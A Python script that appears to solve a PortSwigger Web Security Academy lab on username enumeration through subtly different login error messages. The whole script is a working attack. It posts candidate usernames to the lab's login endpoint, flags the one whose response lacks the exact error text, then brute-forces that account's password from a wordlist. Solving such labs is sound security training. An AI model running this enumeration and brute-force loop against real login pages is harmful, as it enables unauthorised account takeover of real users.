#!/usr/bin/env python


'''This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

Candidate usernames
Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

Lab link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
'''

import requests

lab_id = '0a84004503da0aa0804f586400b200af' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/login" 

#Get usernames and passwords loaded
with open('usernames.txt') as u:
    usernames = [line.rstrip() for line in u]

with open('passwords.txt') as p:
    passwords = [line.rstrip() for line in p]

for username in usernames:
    data = {'username': username, 'password': "frank"}
    r = requests.post(uri, data=data)
    # Valid user will have "Invalid username or password " in response. (without the period at the end, and the space)
    if r.status_code != 200:
        print("Application produced an invalid response, exiting")
        break
    if "Invalid username or password." not in r.text:
        print(f"Username found: '{username}'. Attempting to login as user")
        # Attempt to find the password of the triggered user
        for password in passwords:
            data = {'username': username, 'password': password}
            r2 = requests.post(uri, data=data)
            if "Invalid username or password " not in r2.text:
                print(f"Login credentials found with '{username}' and '{password}'. Solved")         